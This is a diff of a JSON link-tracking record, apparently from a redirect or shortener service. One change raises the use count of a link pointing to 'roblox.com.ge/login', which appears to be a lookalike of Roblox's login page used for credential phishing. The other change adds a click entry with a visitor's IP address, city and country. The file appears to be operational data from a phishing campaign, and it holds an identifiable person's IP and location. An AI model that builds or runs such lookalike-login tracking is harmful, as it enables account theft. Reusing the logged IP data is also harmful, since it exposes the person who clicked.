@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1425,
+    "useCount": 1426,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11568,6 +11568,14 @@
         "city": "Atlanta",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777429960867,
+        "ip": "190.80.244.91",
+        "country": "Dominican Republic",
+        "city": "Santo Domingo",
+        "flag": "🇩🇴",
+        "countryCode": "DO"
       }
     ]
   },
